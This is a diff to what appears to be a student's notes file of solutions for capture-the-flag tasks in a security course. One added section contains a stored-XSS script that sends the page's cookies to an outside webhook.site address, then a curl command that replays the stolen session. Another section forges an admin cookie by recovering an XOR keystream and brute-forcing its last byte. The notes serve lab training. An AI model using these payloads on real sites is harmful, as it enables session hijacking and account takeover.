@@ -38,10 +38,14 @@
 
 1. testtest
 2. Qwerty123456789!
-3. https://cats.is-course.ru/feedback
-4. give link to cats.html
-5. catch all the cookies
-6. ?
+3. https://stored-xss.iscourse.ru/feedback
+4. create post with
+<script>
+new Image().src = "https://webhook.site/<your>/?c=" + encodeURIComponent(document.cookie);
+</script>
+5. give link to post to feedback
+6. take cookie
+7. curl -b "session=<cookie>" https://stored-xss.iscourse.ru
 
 ## https://extender.is-course.ru
 
@@ -71,5 +75,18 @@ makes so that only one unknown byte of flag is in block and checks how all varie
 
 ## xor: the pillar of cryptography
 
-1. collect_cookies.py
-2. ?
+1. https://pillar.is-course.ru
+2. only test:test user available
+3. cookie = base64(`(username + ":" + str(unix_timestamp)) XOR keystream`) and keystream is reset each minute
+4. login as test:test and get cookie
+5. recover the keystream:
+   - `KS[0:5] = C[0:5] XOR "test:"`
+   - `KS[5:14] = C[5:14] XOR str(server_unix_ts)` (timestamp = nginx Date)
+6. give cookies based on `admin:str(T)[9]` + `0..255` (last byte bruteforced)
+`curl -b "session=<base64>" https://pillar.is-course.ru/`
+
+## HMAC: moodquery
+
+1. moodquery.py
+for anonymous hmac both secret and message are known from source so forging request is trivial
+2. no symlinks found, no logs found, all hashes are high entropy
